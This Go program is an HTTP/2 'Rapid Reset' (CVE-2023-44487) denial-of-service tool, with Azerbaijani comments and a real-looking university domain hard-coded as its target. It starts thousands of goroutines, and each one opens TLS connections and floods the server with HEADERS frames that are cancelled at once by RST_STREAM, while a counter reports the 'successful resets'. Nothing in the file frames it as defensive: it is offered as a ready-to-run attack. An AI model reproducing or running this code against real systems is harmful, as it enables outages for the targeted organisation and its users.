package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var (
	target  = "bbu.edu.az" // Host və Port
	workers = 3000                 // Railway üçün maksimum goroutine
	count   uint64
	errors  uint64
)

func main() {
	fmt.Printf("[!!!] KATAKLİZM AKTİVDİR: %s\n", target)
	fmt.Println("[!] Protokol səviyyəli TLS Handshake + HTTP2 Reset başladıldı.")

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				attack()
			}
		}()
	}

	// Hesabat
	go func() {
		for {
			time.Sleep(3 * time.Second)
			fmt.Printf("[STATS] Uğurlu Reset: %d | Bloklanan/Xəta: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
		}
	}()

	wg.Wait()
}

func attack() {
	// TLS 1.3 və HTTP/2 ALPN imitasiyası
	cfg := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		ServerName:         "one-vv6543.com",
	}

	dialer := net.Dialer{Timeout: 5 * time.Second}
	conn, err := dialer.Dial("tcp", target)
	if err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	defer conn.Close()

	tlsConn := tls.Client(conn, cfg)
	if err := tlsConn.Handshake(); err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	defer tlsConn.Close()

	// HTTP/2 Preface göndərilməsi (Cihazın brauzer olduğunu sübut edir)
	tlsConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))

	framer := http2.NewFramer(tlsConn, tlsConn)
	framer.WriteSettings(http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000})

	// Sürətli Reset Döngüsü - Serverin beynini yandıran hissə
	for i := 0; i < 500; i++ {
		streamID := uint32(2*i + 1)
		
		// HEADERS göndər və dərhal RST_STREAM ilə ləğv et
		// Bu "Rapid Reset" (CVE-2023-44487) metodudur
		var headerBuf []byte
		enc := hpack.NewEncoder(nil) // Təxmini emal üçün
		_ = enc

		framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:   streamID,
			EndHeaders: true,
			EndStream:  false,
			BlockFragment: []byte("\x82\x86\x84\x41\x8c\xf1\xe3\xc2\xe5\xf2\x3a\x6b\xa0\xab\x90\xf4\xff"), // Realist Header imitasiyası
		})

		// DƏRHAL RESET - Server hər axın üçün resurs ayırır amma heç nə ala bilmir
		framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
		atomic.AddUint64(&count, 1)
	}
}
